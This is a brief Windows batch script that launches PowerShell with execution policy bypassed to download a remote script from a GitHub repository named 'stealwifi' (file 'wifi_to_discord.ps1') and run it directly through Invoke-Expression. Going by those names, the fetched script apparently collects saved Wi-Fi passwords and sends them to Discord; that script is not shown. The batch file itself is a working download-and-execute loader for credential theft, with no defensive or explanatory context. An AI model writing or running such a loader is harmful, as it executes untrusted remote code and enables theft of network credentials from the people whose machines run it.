@echo off
set SCRIPT_URL=https://raw.githubusercontent.com/FISTOFDARKNESS/stealwifi/refs/heads/main/wifi_to_discord.ps1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri '%SCRIPT_URL%' -UseBasicParsing).Content"
pause
